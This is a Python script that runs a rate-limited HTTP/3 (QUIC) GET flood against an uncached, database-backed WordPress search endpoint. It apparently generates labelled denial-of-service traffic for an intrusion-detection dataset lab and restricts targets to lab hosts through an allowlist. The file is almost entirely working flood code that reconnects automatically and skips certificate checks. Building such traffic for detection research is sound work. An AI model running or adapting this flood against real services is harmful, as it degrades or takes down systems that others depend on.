#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
h3_flood.py — application-layer HTTP/3 (QUIC) GET flood for the lab DoS scenario.

WHY THIS EXISTS (v2)
--------------------
The v1 DoS ran over TCP (http_flood.py). That left EVERY attack flow on TCP while benign
QUIC/H3 traffic lived on UDP, so `transport` alone separated the classes with balanced
accuracy 1.0 — the dominant shortcut in the shortcut_audit of all seven v1 runs. Putting
the DoS on HTTP/3 puts attack volume on UDP too, which is what removes that shortcut.
Combined with benign H3 traffic (benign_clients.py aioquic profile), neither `transport`
nor `alpn` predicts the label any more.

WHY RATE-LIMITED
----------------
topologia_lab.md warns that port mirroring introduces timing delay, so the v1 DoS was
already meant to be modest, not a raw flood. Each config in CONFIG_MATRIX carries a
`dos_rate` (50-200) that the OLD http_flood.py silently ignored — it flooded at full
speed. This tool honours it: --rate is the target requests/second across all workers, so
the DoS degrades the DB-backed endpoint without saturating the mirror or producing
malformed flows on the attacker side.

WHAT DEGRADES THE SERVICE
-------------------------
The same thing as v1: an UNCACHED, DB-backed endpoint (WordPress search, /?s=load) forces
one MariaDB query per request. The transport (H3 vs TCP) does not change that — the
bottleneck is the database, so the effect-verification story from v1 carries over.

CONTRACT (mirrors http_flood.py so run_attacks/attack_scenarios change minimally)
    python3 h3_flood.py --url https://<host>/?s=load --workers <n> --seconds <s> --rate <r>
Exit 0 if at least one request was sent (the attack RAN; whether it DEGRADED the service
is decided later by service_monitor --analyze, exactly as for every attack), else 2.

SAFETY: only the lab victim (blog.lab / shop.lab / 10.10.10.11) is a permitted target;
anything else is refused before a single packet is sent.
"""

import argparse
import asyncio
import ssl
import sys
import time
from urllib.parse import urlsplit

from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import DataReceived, HeadersReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent

ALLOWED_HOSTS = {"blog.lab", "shop.lab", "10.10.10.11"}


def guard(url):
    """Refuse any target that is not the lab victim. Returns (host, port, path)."""
    u = urlsplit(url)
    host = (u.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        sys.exit("REFUSED: {!r} is not a permitted lab target {}.".format(
            host, sorted(ALLOWED_HOSTS)))
    return host, (u.port or 443), (u.path + ("?" + u.query if u.query else "")) or "/"


class _H3(QuicConnectionProtocol):
    """One QUIC connection carrying many H3 requests. Reusing a connection is what a
    real HTTP/3 client does; each worker holds one, so N workers == N concurrent QUIC
    connections in the capture, all attack-labelled."""

    def __init__(self, *a, **k):
        super().__init__(*a, **k)
        self._h3 = H3Connection(self._quic)
        self._waiters = {}                       # stream_id -> Future

    def request(self, authority, path):
        sid = self._quic.get_next_available_stream_id()
        self._h3.send_headers(sid, [
            (b":method", b"GET"), (b":scheme", b"https"),
            (b":authority", authority.encode()), (b":path", path.encode()),
        ], end_stream=True)
        fut = self._loop.create_future()
        self._waiters[sid] = fut
        self.transmit()
        return fut

    def quic_event_received(self, event: QuicEvent) -> None:
        for ev in self._h3.handle_event(event):
            sid = getattr(ev, "stream_id", None)
            if isinstance(ev, HeadersReceived):
                pass
            elif isinstance(ev, DataReceived) and ev.stream_ended:
                fut = self._waiters.pop(sid, None)
                if fut and not fut.done():
                    fut.set_result(True)


async def _worker(host, port, path, deadline, gap, counter):
    """Hold one QUIC connection and issue paced requests until the deadline.

    `gap` is the per-worker inter-request delay that realises the global --rate. On any
    connection error the worker reconnects: a DoS naturally trips server-side limits, and
    a dropped connection must not silently stop the attack.
    """
    cfg = QuicConfiguration(alpn_protocols=H3_ALPN, is_client=True)
    cfg.verify_mode = ssl.CERT_NONE              # private lab CA; a DoS does not validate
    while time.time() < deadline:
        try:
            async with connect(host, port, configuration=cfg, create_protocol=_H3) as cli:
                while time.time() < deadline:
                    t0 = time.time()
                    try:
                        await asyncio.wait_for(cli.request(host, path), timeout=15)
                        counter["sent"] += 1
                    except Exception:
                        counter["err"] += 1
                        break                    # reconnect
                    slept = time.time() - t0
                    if gap > slept:
                        await asyncio.sleep(gap - slept)
        except Exception:
            counter["err"] += 1
            await asyncio.sleep(0.2)             # brief backoff before reconnecting


async def _main(host, port, path, workers, seconds, rate):
    counter = {"sent": 0, "err": 0}
    deadline = time.time() + seconds
    # global rate spread across workers: each worker paces itself so the SUM ~= rate.
    gap = (workers / rate) if rate > 0 else 0.0
    print("h3_flood: {} workers -> https://{}{} for {}s at ~{} req/s".format(
        workers, host, path, seconds, rate))
    await asyncio.gather(*[
        _worker(host, port, path, deadline, gap, counter) for _ in range(workers)])
    print("h3_flood done: requests_sent={} errors={}".format(counter["sent"], counter["err"]))
    return 0 if counter["sent"] > 0 else 2


def main():
    ap = argparse.ArgumentParser(description="Lab HTTP/3 GET flood (DoS scenario)")
    ap.add_argument("--url", required=True, help="target URL (must be the lab victim)")
    ap.add_argument("--workers", type=int, required=True, help="concurrent QUIC connections")
    ap.add_argument("--seconds", type=int, required=True, help="attack duration")
    ap.add_argument("--rate", type=int, required=True,
                    help="target requests/second across all workers (uses the config's dos_rate)")
    args = ap.parse_args()
    if args.workers <= 0 or args.seconds <= 0 or args.rate <= 0:
        sys.exit("ABORT: --workers, --seconds and --rate must be > 0.")
    host, port, path = guard(args.url)
    try:
        return asyncio.run(_main(host, port, path, args.workers, args.seconds, args.rate))
    except KeyboardInterrupt:
        return 2


if __name__ == "__main__":
    sys.exit(main())
